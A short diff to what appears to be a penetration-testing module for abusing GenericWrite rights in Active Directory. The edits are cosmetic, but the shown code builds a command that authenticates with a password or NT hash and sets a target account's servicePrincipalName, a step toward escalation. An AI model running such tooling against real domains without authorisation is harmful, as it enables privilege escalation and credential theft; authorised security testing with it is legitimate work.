@@ -1,6 +1,5 @@
-"""GenericWrite abuse — modify target attributes for escalation."""
+"""GenericWrite abuse  -  modify target attributes for escalation."""
 
-from __future__ import annotations
 from typing import Any
 
 MANIFEST = {
@@ -31,7 +30,7 @@ def run(args: Any) -> int:
         if cred.password:
             cmd += ["-p", cred.password]
         elif cred.nthash:
-            cmd += ["--hashes", ":{}".format(cred.nthash)]
+            cmd += ["--hashes", f":{cred.nthash}"]
         if dc_ip:
             cmd += ["--host", dc_ip]
         cmd += ["set", "object", target_account or "", "servicePrincipalName",
